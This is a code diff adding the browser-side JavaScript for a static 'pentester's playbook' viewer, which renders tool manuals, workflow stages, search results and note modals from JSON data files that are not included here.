+                    <p class="module-description">${escapeHtml(meta.summary || "Compact workflow notes and snippets.")}</p>
+                </div>
+                <div class="module-summary-tail">
+                    <span class="section-chip">${pluralize(moduleGroup.items.length, "entry")}</span>
+                    <span class="module-chevron material-symbols-outlined">expand_more</span>
+                </div>
+            </summary>
+            <div class="module-body">
+                ${(meta.tools || []).length > 0 ? `<div class="module-tools-row">${buildModuleToolMarkup(meta)}</div>` : ""}
+                ${buildModuleFeatureMarkup(moduleGroup)}
+                <div class="result-tools">
+                    ${toolsMarkup}
+                </div>
+            </div>
+        </details>
+    `;
+}
+
+function buildPathSectionMarkup(pathGroup) {
+    const pathSummary = activeView.query
+        ? `${pluralize(pathGroup.items.length, "match")} across ${pluralize(pathGroup.modules.length, "workflow")}.`
+        : `${pluralize(pathGroup.modules.length, "workflow")} in this stage.`;
+    const modulesMarkup = pathGroup.modules
+        .map((moduleGroup, moduleIndex) => buildModuleSectionMarkup(moduleGroup, pathGroup, moduleIndex))
+        .join("");
+
+    return `
+        <section class="result-section">
+            <header class="result-section-header">
+                <div class="section-copy">
+                    <span class="section-kicker">Stage</span>
+                    <h2 class="section-title">${escapeHtml(pathGroup.name)}</h2>
+                    <p class="section-subcopy">${escapeHtml(pathGroup.meta.summary || pathSummary)}</p>
+                </div>
+                <span class="section-chip">${pluralize(pathGroup.items.length, "entry")}</span>
+            </header>
+            <div class="module-stack">
+                ${modulesMarkup}
+            </div>
+        </section>
+    `;
+}
+
+function buildEntryResultsMarkup(items) {
+    const groups = buildDisplayGroups(items);
+    return groups
+        .map(group => buildPathSectionMarkup(group))
+        .join("");
+}
+
+function renderEntryResults(items) {
+    payloadContainer.innerHTML = buildEntryResultsMarkup(items);
+    updateShellHelper();
+}
+
+function buildToolSearchCardMarkup(toolManual) {
+    const guideToken = encodeInlineValue(toolManual.name);
+
+    return `
+        <button
+            class="tool-search-card tool-search-result"
+            type="button"
+            onclick="loadToolView(decodeURIComponent('${guideToken}'))"
+            title="Open ${escapeHtml(toolManual.name)} manual"
+        >
+            <span class="tool-search-copy">
+                <span class="tool-search-title-row">
+                    <span class="tool-pill">${escapeHtml(toolManual.name)}</span>
+                </span>
+                <span class="tool-search-summary">${escapeHtml(toolManual.summary || `${toolManual.name} manual.`)}</span>
+            </span>
+            <span class="tool-search-open material-symbols-outlined">arrow_forward</span>
+        </button>
+    `;
+}
+
+function buildToolSearchSectionMarkup(toolMatches) {
+    return `
+        <section class="result-section">
+            <header class="result-section-header">
+                <div class="section-copy">
+                    <span class="section-kicker">Tool Matches</span>
+                    <h2 class="section-title">Tool manuals</h2>
+                    <p class="section-subcopy">Click a tool to open its manual.</p>
+                </div>
+                <span class="section-chip">${pluralize(toolMatches.length, "tool match")}</span>
+            </header>
+            <div class="tool-search-grid">
+                ${toolMatches.map(buildToolSearchCardMarkup).join("")}
+            </div>
+        </section>
+    `;
+}
+
+function buildManualMetaMarkup(values = [], className = "tag-chip", emptyText = "Not captured yet.") {
+    if (!values || values.length === 0) {
+        return `<span class="flag-empty">${escapeHtml(emptyText)}</span>`;
+    }
+
+    return values.map(value => `<span class="${className}">${escapeHtml(value)}</span>`).join("");
+}
+
+function buildManualCoverageBlock(label, values = [], className = "tag-chip") {
+    if (!values || values.length === 0) {
+        return "";
+    }
+
+    return `
+        <div>
+            <span class="manual-inline-label">${escapeHtml(label)}</span>
+            <div class="tag-row">${buildManualMetaMarkup(values, className)}</div>
+        </div>
+    `;
+}
+
+function buildManualCardMarkup(title, body, kicker = "Manual") {
+    return `
+        <article class="manual-card">
+            <span class="manual-card-kicker">${escapeHtml(kicker)}</span>
+            <h3 class="manual-card-title">${escapeHtml(title)}</h3>
+            ${body}
+        </article>
+    `;
+}
+
+function buildManualParametersMarkup(parameters = []) {
+    if (parameters.length === 0) {
+        return `<p class="manual-empty-copy">No explicit parameters are saved for this tool yet.</p>`;
+    }
+
+    return `
+        <div class="manual-card-grid">
+            ${parameters.map(parameter => buildManualCardMarkup(
+                parameter.name,
+                `<p class="manual-card-copy">${escapeHtml(parameter.description || "Saved parameter reference.")}</p>`,
+                "Parameter"
+            )).join("")}
+        </div>
+    `;
+}
+
+function buildManualReferenceMarkup(referenceItems = []) {
+    if (referenceItems.length === 0) {
+        return `<p class="manual-empty-copy">No flag or control notes are saved for this tool yet.</p>`;
+    }
+
+    return `
+        <div class="manual-card-grid">
+            ${referenceItems.map(item => buildManualCardMarkup(
+                item.name,
+                `
+                    <p class="manual-card-copy">${escapeHtml(item.description || "Saved tool reference item.")}</p>
+                    ${item.use_case ? `<p class="manual-card-meta">${escapeHtml(item.use_case)}</p>` : ""}
+                `,
+                item.type || "Reference"
+            )).join("")}
+        </div>
+    `;
+}
+
+function buildManualRelatedToolsMarkup(relatedTools = []) {
+    if (relatedTools.length === 0) {
+        return `<p class="manual-empty-copy">No related tools suggested yet.</p>`;
+    }
+
+    return `
+        <div class="tag-row">
+            ${relatedTools.map(toolName => `
+                <button class="secondary-btn inline-btn related-tool-btn" type="button" onclick="loadToolView(decodeURIComponent('${encodeInlineValue(toolName)}'))">
+                    ${escapeHtml(toolName)}
+                </button>
+            `).join("")}
+        </div>
+    `;
+}
+
+function buildManualExamplesMarkup(items) {
+    const groups = buildDisplayGroups(items);
+
+    return groups
+        .map(group => buildPathSectionMarkup(group))
+        .join("");
+}
+
+function renderSearchResults(toolMatches = [], entryMatches = []) {
+    payloadContainer.innerHTML = [
+        toolMatches.length > 0 ? buildToolSearchSectionMarkup(toolMatches) : "",
+        entryMatches.length > 0 ? buildEntryResultsMarkup(entryMatches) : ""
+    ].filter(Boolean).join("");
+    updateShellHelper();
+}
+
+function renderToolManualPage(toolName) {
+    const toolManual = getToolManual(toolName);
+    const manualMarkup = toolManual.manual_url
+        ? `<a class="doc-link doc-pill" href="${escapeHtml(toolManual.manual_url)}" target="_blank" rel="noreferrer">${escapeHtml(toolManual.manual_label || "Manual")}</a>`
+        : "";
+    const coverageMarkup = [
+        buildManualCoverageBlock("Stages", toolManual.stages),
+        buildManualCoverageBlock("Workflows", toolManual.workflows),
+        buildManualCoverageBlock("Platforms", toolManual.platforms, "platform-badge")
+    ].filter(Boolean).join("");
+    const parametersSection = toolManual.parameters.length > 0
+        ? `
+            <div class="manual-section">
+                <div class="manual-section-header">
+                    <div>
+                        <span class="section-kicker">Parameters</span>
+                        <h2 class="section-title">Useful inputs</h2>
+                    </div>
+                </div>
+                ${buildManualParametersMarkup(toolManual.parameters)}
+            </div>
+        `
+        : "";
+    const referenceSection = toolManual.reference_items.length > 0
+        ? `
+            <div class="manual-section">
+                <div class="manual-section-header">
+                    <div>
+                        <span class="section-kicker">Reference</span>
+                        <h2 class="section-title">Helpful parameters, flags, and controls</h2>
+                    </div>
+                </div>
+                ${buildManualReferenceMarkup(toolManual.reference_items)}
+            </div>
+        `
+        : "";
+    const relatedSection = toolManual.related_tools.length > 0
+        ? `
+            <div class="manual-section">
+                <div class="manual-section-header">
+                    <div>
+                        <span class="section-kicker">Pairings</span>
+                        <h2 class="section-title">Related tools</h2>
+                    </div>
+                </div>
+                ${buildManualRelatedToolsMarkup(toolManual.related_tools)}
+            </div>
+        `
+        : "";
+    const notesSection = (toolManual.notes || []).length > 0
+        ? `
+            <div class="manual-section">
+                <div class="manual-section-header">
+                    <div>
+                        <span class="section-kicker">Operator Notes</span>
+                        <h2 class="section-title">Keep in mind</h2>
+                    </div>
+                </div>
+                <div class="manual-note-list">
+                    ${toolManual.notes.map(note => `<div class="guide-item">${escapeHtml(note)}</div>`).join("")}
+                </div>
+            </div>
+        `
+        : "";
+    const examplesSection = toolManual.items.length > 0
+        ? `
+            <section class="result-section">
+                <header class="result-section-header">
+                    <div class="section-copy">
+                        <span class="section-kicker">Examples</span>
+                        <h2 class="section-title">Saved workflows and commands</h2>
+                        <p class="section-subcopy">Examples stay below the manual so the tool stays the spotlight.</p>
+                    </div>
+                    <span class="section-chip">${pluralize(toolManual.items.length, "example")}</span>
+                </header>
+                <div class="module-stack">
+                    ${buildManualExamplesMarkup(toolManual.items)}
+                </div>
+            </section>
+        `
+        : "";
+
+    payloadContainer.innerHTML = `
+        <section class="manual-shell">
+            <div class="manual-hero">
+                <div class="manual-hero-copy">
+                    <span class="section-kicker">Tool Manual</span>
+                    <h1 class="manual-title">${escapeHtml(toolManual.name)}</h1>
+                    <p class="manual-summary">${escapeHtml(toolManual.summary || `${toolManual.name} manual.`)}</p>
+                    ${toolManual.syntax ? `<div class="manual-code-block"><span class="manual-inline-label">Syntax</span><code class="tool-syntax">${buildPreviewText(toolManual.syntax)}</code></div>` : ""}
+                </div>
+                <div class="manual-hero-actions">
+                    ${manualMarkup}
+                </div>
+            </div>
+            ${coverageMarkup ? `
+                <div class="manual-section">
+                    <div class="manual-section-header">
+                        <div>
+                            <span class="section-kicker">Coverage</span>
+                            <h2 class="section-title">Where this tool shows up</h2>
+                        </div>
+                    </div>
+                    <div class="manual-chip-stack">
+                        ${coverageMarkup}
+                    </div>
+                </div>
+            ` : ""}
+            ${parametersSection}
+            ${referenceSection}
+            ${relatedSection}
+            ${notesSection}
+        </section>
+        ${examplesSection}
+    `;
+    updateShellHelper();
+}
+
+function syncUrlState() {
+    const params = new URLSearchParams();
+
+    if (activeView.type === "search" && activeView.query) {
+        params.set("q", activeView.query);
+    } else if (activeView.type === "tool" && activeView.tool) {
+        params.set("tool", activeView.tool);
+    } else if (activeView.path) {
+        params.set("path", activeView.path);
+        if (activeView.module) {
+            params.set("module", activeView.module);
+        }
+    }
+
+    const nextUrl = params.toString()
+        ? `${window.location.pathname}?${params.toString()}`
+        : window.location.pathname;
+
+    window.history.replaceState(null, "", nextUrl);
+}
+
+function buildLoadErrorMarkup(message) {
+    return `
+        <div class="empty-state">
+            <h3>Could not load the playbook data</h3>
+            <p class="error-text">${escapeHtml(message)}</p>
+            <pre>python3 -m http.server 4173</pre>
+        </div>
+    `;
+}
+
+function renderLoadError(error) {
+    const localFileMessage = window.location.protocol === "file:"
+        ? "This app loads data with fetch(), so modern browsers block it over file://. Start a local web server from the project folder, then open the app through http://127.0.0.1:4173/."
+        : "The app could not read data.json. Make sure the static files are being served correctly and that data.json is present beside index.html.";
+    const detail = error instanceof Error && error.message ? `${localFileMessage} (${error.message})` : localFileMessage;
+
+    homeDashboard.style.display = "none";
+    payloadContainer.innerHTML = buildLoadErrorMarkup(detail);
+    setResultsMeta("Load error");
+    setClearSearchState(false);
+}
+
+function fetchJsonFile(url) {
+    return fetch(url).then(response => {
+        if (!response.ok) {
+            throw new Error(`${url} returned ${response.status}`);
+        }
+
+        return response.json();
+    });
+}
+
+function rerenderActiveView() {
+    if (activeView.type === "tool" && activeView.tool) {
+        loadToolView(activeView.tool, activeView.path, activeView.module);
+        return;
+    }
+
+    if (activeView.type === "search" && activeView.query) {
+        loadView(null, null, null, activeView.query);
+        return;
+    }
+
+    if (activeView.type === "module" && activeView.path && activeView.module) {
+        loadView(activeView.path, activeView.module, null, "");
+        return;
+    }
+
+    if (activeView.type === "path" && activeView.path) {
+        loadView(activeView.path, null, null, "");
+        return;
+    }
+
+    renderHomeDashboard();
+    goHome();
+}
+
+function loadToolManualOverridesInBackground() {
+    if (hasLoadedToolManualOverrides) {
+        return Promise.resolve();
+    }
+
+    if (toolManualLoadPromise) {
+        return toolManualLoadPromise;
+    }
+
+    toolManualLoadPromise = fetchJsonFile("tool-manuals.json")
+        .then(manualData => {
+            hydrateToolManualOverrides(manualData || {});
+            buildToolManualIndex();
+            hasLoadedToolManualOverrides = true;
+            renderSidebar();
+            rerenderActiveView();
+        })
+        .catch(() => {
+            // Derived manual content still works, so manual override load failures stay non-fatal.
+        })
+        .finally(() => {
+            toolManualLoadPromise = null;
+        });
+
+    return toolManualLoadPromise;
+}
+
+function applyInitialRoute() {
+    const params = new URLSearchParams(window.location.search);
+    const query = params.get("q")?.trim();
+    const pathName = params.get("path")?.trim();
+    const moduleName = params.get("module")?.trim();
+    const toolName = params.get("tool")?.trim();
+
+    if (query) {
+        searchBox.value = query;
+        loadView(null, null, null, query);
+        return true;
+    }
+
+    if (toolName) {
+        loadToolView(toolName, pathName || null, moduleName || null);
+        return true;
+    }
+
+    if (pathName) {
+        loadView(pathName, moduleName || null, null, "");
+        return true;
+    }
+
+    return false;
+}
+
+function loadToolView(toolName, contextPath = null, contextModule = null) {
+    if (!hasLoadedToolManualOverrides) {
+        loadToolManualOverridesInBackground();
+    }
+
+    const toolManual = getToolManual(toolName);
+    const firstItem = toolManual.items[0] || null;
+
+    activeView = {
+        type: "tool",
+        path: contextPath || firstItem?.path || null,
+        module: contextModule || firstItem?.module || null,
+        tool: toolName,
+        query: "",
+        focusedId: firstItem?.entryId || null,
+        broadSearch: false,
+        fuzzySearch: false
+    };
+
+    currentViewDB = toolManual.items || [];
+    currentToolMatches = [];
+    payloadContainer.innerHTML = "";
+    homeDashboard.style.display = "none";
+    searchBox.value = "";
+
+    if (activeView.path) {
+        expandSidebarTo(activeView.path, activeView.module);
+    }
+
+    setResultsMeta(`${toolName} manual • ${pluralize(toolManual.workflows.length, "workflow")} • ${pluralize(toolManual.items.length, "example")}`);
+    setClearSearchState(true);
+    syncUrlState();
+    renderSidebar();
+
+    if (toolManual.items.length === 0) {
+        renderEmptyState("There are no saved examples for that tool yet.");
+        return;
+    }
+
+    renderToolManualPage(toolName);
+}
+
+function loadView(filterPath = null, filterModule = null, filterTool = null, searchQuery = "") {
+    const query = searchQuery.trim();
+
+    activeView = {
+        type: query
+            ? "search"
+            : filterPath && filterModule
+                ? "module"
+                : filterPath
+                    ? "path"
+                    : "home",
+        path: filterPath,
+        module: filterModule,
+        tool: filterTool,
+        query,
+        focusedId: null,
+        broadSearch: false,
+        fuzzySearch: false
+    };
+
+    currentViewDB = [];
+    currentToolMatches = [];
+    payloadContainer.innerHTML = "";
+    homeDashboard.style.display = "none";
+
+    if (query) {
+        const entrySearchResult = getSearchResults(query);
+        const toolSearchResult = getToolSearchResults(query);
+        currentViewDB = entrySearchResult.items;
+        currentToolMatches = toolSearchResult.items.slice(0, 8);
+        activeView.focusedId = currentViewDB[0]?.entryId || null;
+        activeView.broadSearch = entrySearchResult.broad || toolSearchResult.broad;
+        activeView.fuzzySearch = entrySearchResult.fuzzy || toolSearchResult.fuzzy;
+        const sidebarAnchor = currentViewDB[0] || currentToolMatches[0]?.items?.[0];
+        expandSidebarTo(sidebarAnchor?.path || null, sidebarAnchor?.module || null);
+
+        const metaParts = [];
+        if (currentViewDB.length > 0) {
+            metaParts.push(pluralize(currentViewDB.length, "entry match"));
+        }
+        if (currentToolMatches.length > 0) {
+            metaParts.push(pluralize(currentToolMatches.length, "tool match"));
+        }
+        if (activeView.fuzzySearch) {
+            metaParts.push("fuzzy matching");
+        }
+        if (activeView.broadSearch) {
+            metaParts.push("broader match mode");
+        }
+        setResultsMeta(metaParts.join(" • ") || "No matches");
+        setClearSearchState(true);
+    } else if (filterPath && filterModule) {
+        currentViewDB = sortItemsForView(
+            db.filter(item => item.path === filterPath && item.module === filterModule)
+        );
+        activeView.focusedId = currentViewDB[0]?.entryId || null;
+        expandSidebarTo(filterPath, filterModule);
+        searchBox.value = "";
+        setResultsMeta(`${filterModule} • ${pluralize(currentViewDB.length, "entry")}`);
+        setClearSearchState(true);
+    } else if (filterPath) {
+        currentViewDB = sortItemsForView(
+            db.filter(item => item.path === filterPath)
+        );
+        activeView.focusedId = currentViewDB[0]?.entryId || null;
+        expandSidebarTo(filterPath, currentViewDB[0]?.module || null);
+        searchBox.value = "";
+        setResultsMeta(`${filterPath} • ${pluralize(currentViewDB.length, "entry")}`);
+        setClearSearchState(true);
+    } else {
+        goHome();
+        return;
+    }
+
+    syncUrlState();
+    renderSidebar();
+
+    if (activeView.type === "search") {
+        if (currentToolMatches.length === 0 && currentViewDB.length === 0) {
+            renderEmptyState("Try a tool name, workflow name, parameter, or flag.");
+            return;
+        }
+
+        renderSearchResults(currentToolMatches, currentViewDB);
+        return;
+    }
+
+    if (currentViewDB.length === 0) {
+        const emptyMessage = query
+            ? "Try a workflow name, a tool name, a flag, or a smaller search phrase instead of an exact command."
+            : "There are no saved entries for that filter yet.";
+        renderEmptyState(emptyMessage);
+        return;
+    }
+
+    renderEntryResults(currentViewDB);
+}
+
+function goHome() {
+    activeView = {
+        type: "home",
+        path: null,
+        module: null,
+        tool: null,
+        query: "",
+        focusedId: null,
+        broadSearch: false,
+        fuzzySearch: false
+    };
+    currentViewDB = [];
+    currentToolMatches = [];
+    homeDashboard.style.display = "grid";
+    payloadContainer.innerHTML = "";
+    searchBox.value = "";
+    setResultsMeta("Home dashboard");
+    setClearSearchState(false);
+    syncUrlState();
+    renderSidebar();
+}
+
+function executeSearch(query) {
+    searchBox.value = query;
+    loadView(null, null, null, query);
+}
+
+function clearSearch() {
+    goHome();
+}
+
+async function copyCommandById(entryId, button) {
+    const item = currentViewDB.find(entry => entry.entryId === entryId) || db.find(entry => entry.entryId === entryId);
+
+    if (!item) {
+        return;
+    }
+
+    const resolvedCommand = await resolveCommandForCopy(item.command);
+    if (!resolvedCommand) {
+        return;
+    }
+
+    copyInlineText(resolvedCommand, button);
+}
+
+function showNotesModal(item) {
+    const hasQuickNote = Boolean(item.help_menu || item.tip);
+    const hasTags = (item.tags || []).length > 0;
+    const hasFlags = (item.flags || []).length > 0;
+    const hasDoc = Boolean(item.reference_url);
+
+    modalTitle.innerText = `${item.module} • ${item.title}`;
+    modalBody.innerHTML = `
+        <div class="modal-block">
+            <span class="modal-label">Placement</span>
+            <p class="sources-copy">${escapeHtml(`${item.path} -> ${item.module} -> ${item.tool}`)}</p>
+        </div>
+        <div class="modal-block">
+            <span class="modal-label">Entry Type</span>
+            <div class="tag-row">
+                <span class="tag-chip">${escapeHtml(item.type || "Entry")}</span>
+                ${item.platform ? `<span class="tag-chip">${escapeHtml(item.platform)}</span>` : ""}
+            </div>
+        </div>
+        ${hasQuickNote ? `
+            <div class="modal-block">
+                <span class="modal-label">Quick note</span>
+                <pre>${escapeHtml(item.help_menu || item.tip)}</pre>
+            </div>
+        ` : ""}
+        ${hasTags ? `
+            <div class="modal-block">
+                <span class="modal-label">Tags</span>
+                <div class="tag-row">${buildTagMarkup(item.tags || [])}</div>
+            </div>
+        ` : ""}
+        ${hasFlags ? `
+            <div class="modal-block">
+                <span class="modal-label">Flags spotted in example</span>
+                <div class="flags-row">${item.flags.map(flag => `<span class="flag-chip">${escapeHtml(flag)}</span>`).join("")}</div>
+            </div>
+        ` : ""}
+        ${hasDoc ? `
+            <div class="modal-block">
+                <span class="modal-label">Upstream docs</span>
+                <a class="doc-link doc-pill" href="${escapeHtml(item.reference_url)}" target="_blank" rel="noreferrer">${escapeHtml(item.reference_label || item.tool)}</a>
+            </div>
+        ` : ""}
+    `;
+    modal.style.display = "block";
+}
+
+function openEntryNotes(entryId) {
+    const item = currentViewDB.find(entry => entry.entryId === entryId) || db.find(entry => entry.entryId === entryId);
+    if (item) {
+        showNotesModal(item);
+    }
+}
+
+function openToolGuide(toolName) {
+    loadToolView(toolName);
+}
+
+function openSourcesModal() {
+    modalTitle.innerText = "Research sources";
+    modalBody.innerHTML = `
+        <div class="modal-block">
+            <span class="modal-label">Source set</span>
+            <p class="sources-copy">${escapeHtml(appMeta.sources_intro || "This playbook groups the saved snippets around practical methodology references and upstream tool documentation.")}</p>
+            <div class="sources-list">
+                ${(appMeta.sources || [])
+                    .map(source => `
+                        <a class="source-link" href="${escapeHtml(source.url)}" target="_blank" rel="noreferrer">
+                            <span>${escapeHtml(source.label)}</span>
+                            <span class="material-symbols-outlined">open_in_new</span>
+                        </a>
+                    `)
+                    .join("")}
+            </div>
+        </div>
+    `;
+    modal.style.display = "block";
+}
+
+function closeModal() {
+    modal.style.display = "none";
+
+    if (pendingPlaceholderRequest?.resolve) {
+        pendingPlaceholderRequest.resolve(false);
+        pendingPlaceholderRequest = null;
+    }
+}
+
+function isEditableElement(element) {
+    if (!(element instanceof HTMLElement)) {
+        return false;
+    }
+
+    const tagName = element.tagName;
+    return element.isContentEditable
+        || tagName === "INPUT"
+        || tagName === "TEXTAREA"
+        || tagName === "SELECT";
+}
+
+window.addEventListener("click", event => {
+    if (event.target === modal) {
+        closeModal();
+    }
+});
+
+searchBox.addEventListener("input", event => {
+    const query = event.target.value.trim();
+    if (query.length > 0) {
+        loadView(null, null, null, query);
+    } else {
+        goHome();
+    }
+});
+
+document.addEventListener("keydown", event => {
+    if (
+        event.key === "/"
+        && !event.ctrlKey
+        && !event.metaKey
+        && !event.altKey
+        && !isEditableElement(document.activeElement)
+    ) {
+        event.preventDefault();
+        searchBox.focus();
+        searchBox.select();
+    }
+
+    if (event.key === "Escape") {
+        if (modal.style.display === "block") {
+            closeModal();
+        } else if (searchBox.value.trim().length > 0) {
+            clearSearch();
+        }
+    }
+});
+
+applyTheme(currentModeIndex);
+applySidebarState();
+updatePlaceholderButton();
+
+fetchJsonFile("data.json")
+    .then(data => {
+        if (Array.isArray(data)) {
+            appMeta = {
+                title: "my pl4yb00k",
+                subtitle: "A pentester's playbook for fast tool lookup, practical workflows, and clean notes across manuals, flags, and examples.",
+                disclaimer: "Use only on systems you own or are explicitly authorized to assess."
+            };
+            hydrateMeta(appMeta);
+            db = annotateEntries(data);
+        } else {
+            hydrateMeta(data.meta || {});
+            db = annotateEntries(data.entries || []);
+        }
+
+        buildNavTree();
+        buildToolManualIndex();
+        renderSidebar();
+        renderHomeDashboard();
+        if (!applyInitialRoute()) {
+            goHome();
+        }
+        loadToolManualOverridesInBackground();
+    })
+    .catch(error => {
+        renderLoadError(error);
+    });
